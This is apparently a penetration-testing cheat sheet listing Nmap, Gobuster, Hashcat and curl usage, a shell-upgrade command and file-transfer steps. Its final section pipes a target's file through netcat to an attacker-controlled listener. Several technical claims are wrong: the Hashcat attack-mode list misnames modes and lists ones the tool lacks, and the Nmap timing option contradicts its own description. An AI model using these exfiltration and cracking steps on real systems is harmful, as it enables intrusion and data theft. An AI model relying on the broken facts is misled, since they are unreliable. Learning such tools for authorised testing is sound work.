# Penetration Testing Basics

## Reconnaissance

### Active Reconnaissance with Nmap

Nmap (Network Mapper) is a powerful tool used to discover hosts and services on a computer network. It is commonly used during penetration testing for port scanning, service detection, and operating system identification.

#### Common Nmap Options:
- `-sS`: Performs a stealthy SYN scan.
- `-sV`: Detects service versions.
- `-O`: Detects the operating system.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-T2`: Sets a "polite" timing template to reduce network congestion or detection.
- `-p-`: Scans all 65,535 TCP ports.
- `target_ip`: Replace this with the IP address of your target.

#### Full Nmap Command:
```bash
sudo nmap -sS -sV --script=default,vuln -p- -T5 <ip target_ip>
```

### Gobuster Command
DirBuster is a powerful tool for brute-forcing directories and file names on a web server to enumerate hidden resources
```bash
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
In Kali there is a GUI version called DirBuster
![image](https://github.com/user-attachments/assets/cbd21222-0f45-47da-bc48-99025523a4c5)


#### Hashcat Usage Guide

Hashcat is a powerful password cracking tool that supports multiple hash algorithms and attack modes. This guide covers the essential options and their explanations to help you get started.

#### Basic Syntax

```bash
hashcat -m <hash_mode> -a <attack_mode> <hash_file> <wordlist>
```
#### Hashcat Attack Modes:

- `-a 0`: **Straight** (Dictionary attack)  
  Tries each word in the wordlist.  
  Example: `hashcat -m 0 -a 0 hash.txt rockyou.txt`

- `-a 1`: **Combination**  
  Combines two wordlists.  
  Example: `hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt`

- `-a 2`: **Mask**  
  Generates passwords based on a mask pattern.  
  Example: `hashcat -m 0 -a 2 hash.txt ?l?l?d?d`

- `-a 3`: **Brute-force**  
  Tries all combinations of a given character set.  
  Example: `hashcat -m 0 -a 3 hash.txt ?a?a?a?a`

- `-a 4`: **Toggle-case**  
  Tries passwords with different case variations.  
  Example: `hashcat -m 0 -a 4 hash.txt`

- `-a 5`: **Hybrid Mask + Wordlist**  
  Combines a wordlist and a mask.  
  Example: `hashcat -m 0 -a 5 hash.txt wordlist.txt ?d?d`

#### Common Hashcat Hash Modes:

- `-m 0`: MD5  
- `-m 100`: SHA1  
- `-m 1400`: SHA256  
- `-m 1700`: SHA512  
- `-m 3000`: LM  


## Useful Curl Options

### Basic Usage
#### Silent Mode and Debugging
- `-s`: Silent mode. Suppresses the progress meter and error messages.
- `-v`: Verbose mode. Provides detailed information about the request and response.

#### Proxy Support
- `-x <proxy>`: Specifies a proxy to use for the request. Example: `-x http://proxy.example.com:8080`.

#### Custom Headers and Data
- `-H <header>`: Adds a custom header to the request. Example: `-H "Authorization: Bearer <token>"`.
- `-d <data>`: Sends data in a POST request. Example: `-d "param=value"`.

### Adding Cookies
- `-b <data|filename>`: Sends cookies with the request. Example:
  - Inline cookies: `-b "name=value; name2=value2"`
  - From a file: `-b cookies.txt`
- `-c <filename>`: Saves cookies to a file. Example: `-c cookies.txt`.


#### HTTP Method Specification
- `-X <method>`: Specifies the HTTP method to use. Example: `-X POST`.

#### Output Handling
- `-o <file>`: Saves output to a file instead of standard output. Example: `-o response.txt`.
- `-O`: Saves the file with the same name as the remote file.

#### SSL/TLS Options
- `-k`: Ignores SSL certificate errors.

#### Redirects
- `-L`: Follows redirects automatically.

#### Authentication
- `-u <user:password>`: Supplies credentials for basic authentication.

## Exploit

#### Useful commands:

- `cat /etc/os-release `: **OS version**
- `script /dev/null -c /bin/bash`: **Get a bash shell**
- `sudo -l`: **List our commands you can run as root**



## Hands on Objectives

#### Useful commands:
using scp to transfer files
- `scp <file> character@10.10.14.60:/path/to/destination/`
- Local Machine: `nc -lvnp <PORT> >` Target Machine: `cat '<filename>' | nc <YOURIPADDRESS> <PORT>`
